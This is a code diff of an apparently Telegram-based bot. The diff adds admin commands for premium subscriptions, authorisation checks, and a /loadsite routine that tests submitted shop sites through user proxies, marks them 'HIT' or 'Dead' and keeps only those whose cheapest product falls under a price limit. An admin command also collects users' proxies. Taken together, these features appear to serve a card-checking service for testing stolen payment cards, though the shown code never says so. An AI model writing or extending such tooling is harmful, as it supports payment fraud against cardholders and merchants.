-            price = site_entry.get('price', 'N/A')
-            if price != 'N/A':
-                try:
-                    total_price += float(price)
-                    price_count += 1
-                except:
-                    pass
-            sites_text += f"{i}. {site_url} - ${price}\n"
-        else:
-            sites_text += f"{i}. {site_entry}\n"
-    
-    if price_count > 0:
-        avg_price = total_price / price_count
-        sites_text += f"\n📊 Statistics:\n"
-        sites_text += f"Total Sites: {len(sites_list)}\n"
-        sites_text += f"Avg Price: ${avg_price:.2f}\n"
-    
-    sites_text += f"\nTo remove sites, use:\n"
-    sites_text += "`/rmvsite` - Show removal options"
-    
-    # If list is too long, send as file
-    if len(sites_text) > 4000:
-        file_path = f"sites_{user.id}.txt"
-        async with aiofiles.open(file_path, 'w') as f:
-            for site_entry in sites_list:
-                if isinstance(site_entry, dict):
-                    await f.write(f"{site_entry.get('url', 'Unknown')} - ${site_entry.get('price', 'N/A')}\n")
-                else:
-                    await f.write(f"{site_entry}\n")
-        await message.reply_document(
-            file_path,
-            caption=f"📋 Your Working Sites ({len(sites_list)} sites)",
-            disable_web_page_preview=True
-        )
-        os.remove(file_path)
-    else:
-        await message.reply_text(sites_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
+
+    sites_text, keyboard = await build_sites_page(user.id, 0)
+    await message.reply_text(sites_text, reply_markup=keyboard, disable_web_page_preview=True)
 
 @app.on_message(filters.command('rmvsite') & filters.private)
 async def rmvsite_command(client, message):
     """User command: Remove your own sites"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
+    if not await require_authorized_user(message):
+        return
     
     # Parse command arguments
     args = message.text.split()
@@ -2373,6 +2878,8 @@ async def rmvsite_command(client, message):
 async def stats_command(client, message):
     """Show user statistics"""
     user = message.from_user
+    if not await require_authorized_user(message):
+        return
     
     stats = await get_user_stats(user.id)
     if not stats:
@@ -2396,6 +2903,102 @@ async def stats_command(client, message):
     await message.reply_text(stats_text, disable_web_page_preview=True)
 
 # Admin commands
+@app.on_message(filters.command('addpremium') & filters.private)
+async def addpremium_command(client, message):
+    """Admin: add/update premium access for a user."""
+    user = message.from_user
+    if user.id not in ADMINS:
+        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
+        return
+
+    if len(message.command) < 3:
+        await message.reply_text(
+            "Usage: /addpremium <tgid> <days>\n"
+            "Use 0 days for lifetime access.",
+            disable_web_page_preview=True
+        )
+        return
+
+    try:
+        target_user_id = int(message.command[1])
+        days = int(message.command[2])
+    except ValueError:
+        await message.reply_text("❌ Invalid arguments. Example: /addpremium 123456789 30", disable_web_page_preview=True)
+        return
+
+    if days < 0:
+        await message.reply_text("❌ Days must be 0 or greater.", disable_web_page_preview=True)
+        return
+
+    expires_at = await set_user_premium(target_user_id, days)
+    if days == 0:
+        await message.reply_text(
+            f"✅ Premium granted to <code>{target_user_id}</code> (lifetime).",
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+    else:
+        await message.reply_text(
+            f"✅ Premium granted to <code>{target_user_id}</code> for {days} day(s).\n"
+            f"Expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')} UTC",
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+@app.on_message(filters.command(['delpremium', 'removepremium']) & filters.private)
+async def delpremium_command(client, message):
+    """Admin: remove premium access for a user."""
+    user = message.from_user
+    if user.id not in ADMINS:
+        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
+        return
+
+    if len(message.command) < 2:
+        await message.reply_text("Usage: /delpremium <tgid>", disable_web_page_preview=True)
+        return
+
+    try:
+        target_user_id = int(message.command[1])
+    except ValueError:
+        await message.reply_text("❌ Invalid user ID.", disable_web_page_preview=True)
+        return
+
+    removed = await remove_user_premium(target_user_id)
+    if removed:
+        await message.reply_text(f"✅ Premium removed for {target_user_id}.", disable_web_page_preview=True)
+    else:
+        await message.reply_text("❌ User not found.", disable_web_page_preview=True)
+
+@app.on_message(filters.command(['showpremium', 'premiums']) & filters.private)
+async def showpremium_command(client, message):
+    """Admin: list all currently active premium users."""
+    user = message.from_user
+    if user.id not in ADMINS:
+        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
+        return
+
+    premium_users = await get_active_premium_users()
+    if not premium_users:
+        await message.reply_text("ℹ️ No active premium users found.", disable_web_page_preview=True)
+        return
+
+    lines = [f"✅ Active Premium Users: {len(premium_users)}\n"]
+    for idx, doc in enumerate(premium_users, 1):
+        uid = doc.get('user_id')
+        name = doc.get('first_name') or str(uid)
+        if doc.get('premium_lifetime'):
+            expiry_text = "Lifetime"
+        else:
+            exp = doc.get('premium_expires_at')
+            expiry_text = exp.strftime("%Y-%m-%d %H:%M:%S UTC") if exp else "Unknown"
+        lines.append(f"{idx}. {name} (<code>{uid}</code>) - {expiry_text}")
+
+    await message.reply_text(
+        "\n".join(lines),
+        parse_mode=ParseMode.HTML,
+        disable_web_page_preview=True
+    )
+
 @app.on_message(filters.command('leechproxy'))
 async def leechproxy_command(client, message):
     """Admin: Get user proxies"""
@@ -2529,20 +3132,44 @@ async def loadsite_command(client, message):
         await message.reply_text("❌ Please provide sites (one per line)", disable_web_page_preview=True)
         return
     
-    # Add sites
+    # Check each site first; only add if cheapest product is below configured limit
+    user_proxies = await get_user_proxies(user.id)
+    proxy = random.choice(user_proxies) if user_proxies else None
+
+    hit_count = 0
     added = 0
+    skipped_price = 0
+    dead = 0
     failed = 0
     messages = []
     
     for site in sites:
+        is_working, status_msg, product_info = await test_site_connection(site, proxy)
+        if not is_working:
+            dead += 1
+            continue
+
+        hit_count += 1
+        if not is_price_under_limit(product_info):
+            skipped_price += 1
+            continue
+
         success, msg = await add_global_site(site)
         if success:
             added += 1
         else:
             failed += 1
-            messages.append(msg)
+            messages.append(f"{site} -> {msg}")
     
-    response = f"✅ Global sites added!\n📊 Added: {added}\n❌ Failed: {failed}"
+    response = (
+        "✅ Global site processing complete!\n"
+        f"📊 Total Input: {len(sites)}\n"
+        f"🟢 HIT (Working): {hit_count}\n"
+        f"✅ Added (< ${MAX_SITE_PRICE_USD:.0f}): {added}\n"
+        f"⚠️ Not Added (>= ${MAX_SITE_PRICE_USD:.0f}): {skipped_price}\n"
+        f"🔴 Dead: {dead}\n"
+        f"❌ Failed Add: {failed}"
+    )
     if messages:
         response += f"\n\n⚠️ Issues:\n" + "\n".join(messages[:5])
     
